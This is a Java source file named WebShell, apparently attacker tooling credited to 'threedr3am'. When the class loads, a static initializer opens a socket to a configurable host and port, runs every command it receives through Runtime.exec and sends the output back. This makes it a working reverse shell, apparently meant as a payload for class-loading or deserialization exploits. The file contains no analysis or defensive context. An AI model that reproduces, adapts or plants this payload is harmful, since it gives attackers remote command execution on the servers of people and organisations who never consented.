import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;

/**
 * @author threedr3am
 */
public class WebShell {

  private static final String host = "127.0.0.1";
  private static final int port = 12123;

  static {
    try {
      System.out.println("run shell...");
      new Thread(() -> {
        try {
          Socket socket = new Socket(host, port);
          BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
          bufferedWriter.write("success!");
          bufferedWriter.newLine();
          bufferedWriter.flush();

          BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
          while (true) {
            String line;
            while ((line = bufferedReader.readLine()) == null);
            Process pro = null;
            try {
              pro = Runtime.getRuntime().exec(line);
            } catch (Exception e) {
              e.printStackTrace();
              bufferedWriter.write(e.getMessage());
              bufferedWriter.newLine();
              bufferedWriter.flush();
            }
            if (pro == null) {
              continue;
            }
            BufferedReader read = new BufferedReader(new InputStreamReader(pro.getInputStream()));
            String line2;
            while ((line2 = read.readLine()) != null) {
              bufferedWriter.write(line2);
              bufferedWriter.newLine();
              bufferedWriter.flush();
            }
          }

        } catch (IOException e) {
          e.printStackTrace();
        }
      }).start();
    } catch (Throwable e) {
      e.printStackTrace();
    }
  }

  public static void main(String[] args) {
  }
}
